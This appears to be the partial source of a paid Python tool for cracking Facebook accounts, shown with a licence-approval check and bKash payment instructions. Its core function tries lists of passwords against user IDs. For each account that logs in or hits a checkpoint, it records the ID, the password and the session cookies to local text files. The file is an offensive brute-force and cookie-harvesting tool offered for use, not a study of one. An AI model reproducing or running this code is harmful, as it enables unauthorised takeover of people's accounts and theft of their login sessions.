#_______===AJMIR HOSSAIN=======________
import os
import sys
import time
import requests
...
try:
	...
	#os.system('git clone https://github.com/AJMIR-HOSSAIN-404')
...
logo =("""   
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[33;1m║\033[38;5;46m░█████╗\033[38;5;46m░░░░░░██╗\033[38;5;46m███╗░░░███╗\033[38;5;46m██╗\033[38;5;46m██████╗░\033[38;5;46m║
\033[33;1m║\033[38;5;46m██╔══██╗\033[38;5;46m░░░░░██║\033[38;5;46m████╗░████║\033[38;5;46m██║\033[38;5;46m██╔══██╗\033[38;5;46m║
\033[33;1m║\033[38;5;46m███████║\033[38;5;46m░░░░░██║\033[38;5;46m██╔████╔██║\033[38;5;46m██║\033[38;5;46m██████╔╝\033[38;5;46m║
\033[33;1m║\033[38;5;46m██╔══██║\033[38;5;46m██╗░░██║\033[38;5;46m██║╚██╔╝██║\033[38;5;46m██║\033[38;5;46m██╔══██╗\033[38;5;46m║
\033[33;1m║\033[38;5;46m██║░░██║\033[38;5;46m╚█████╔╝\033[38;5;46m██║░╚═╝░██║\033[38;5;46m██║\033[38;5;46m██║░░██║\033[38;5;46m║
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               
┌━━━━━━━━━━━━━━━━━ AJMIR ━━━━━━━━━━━━━━━━━━┑
\033[38;5;46m  CREATED BY   :  AJMIR HOSSAIN             
\033[38;5;46m  FACEBOK      :  Ajmir Hossain             
\033[38;5;46m  GITHUB       :  FB-KING-AJMIR     
\033[38;5;46m  STATUS       :   PAID😈          
\033[38;5;46m  TOOL VIRSION :  2.09                    
\033[38;5;46m  TOOL WORK    :  ONLY  DATA           
└━━━━━━━━━━━━━━━━━ HOSSAIN ━━━━━━━━━━━━━━━━━┘
""")
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/FB-KING-AJMIR/FB-KING-PAID/blob/main/3972cfc401acaf40820b84c9207750ed7fe8a640').text
    if id in httpCaht:
      ...
      print("\x1b[1;91m----------------------------------------------")
      print("\x1b[1;91m For 15 Days Approval Price 200Tk One Month Price 400 Tk")
      print('BKASH PERSONAL - +8801734429647')
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://youtube.com/@Ajmir_142')
		crack_file()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[AJMIR] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mAJMIR-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m😈\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('AJMIR-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('AJMIR-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(AJMIR-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('AJMIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
        ...
        #sys.stdout.write('\r%s   [AJMIR] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
